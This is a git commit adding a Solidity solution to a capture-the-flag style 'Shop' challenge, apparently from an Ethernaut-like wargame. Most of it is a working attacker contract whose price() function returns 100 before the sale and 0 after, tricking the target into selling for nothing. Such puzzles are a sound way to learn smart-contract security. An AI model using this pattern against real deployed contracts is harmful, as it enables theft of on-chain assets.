1b5b02c66e81697ed152966089c4ba3a119c5c20
Gakarot <startradingcentre@gmail.com>
2025-05-15 01:23:53 +0530

    Update solution.sol

--- Challenge_22_Shop/solution.sol
+++ Challenge_22_Shop/solution.sol
@@ -1,1 +1,35 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+/*Solution:
+Use contract address that has price function to call buy() because Shop contract enforce structure at compile time.
+Change value of price as buy() call the price function two times so sending 100 satisfy first check 
+    and sending 0 sets the price in Shop to 0.
+Now you can buy at lower/zero price.
+*/
+
+interface IShop {
+    function buy() external;
+    function isSold() external view returns (bool);
+}
+
+contract MyContract {
+    IShop target;
+
+    constructor(address _target) {
+        target = IShop(_target);
+    }
+
+    function callBuy() public {
+        target.buy();
+    }
+
+    function price() public view returns (uint256) {
+        if (target.isSold()) {
+            return 0;
+        } else {
+            return 100;
+        }
+    }
+}
 
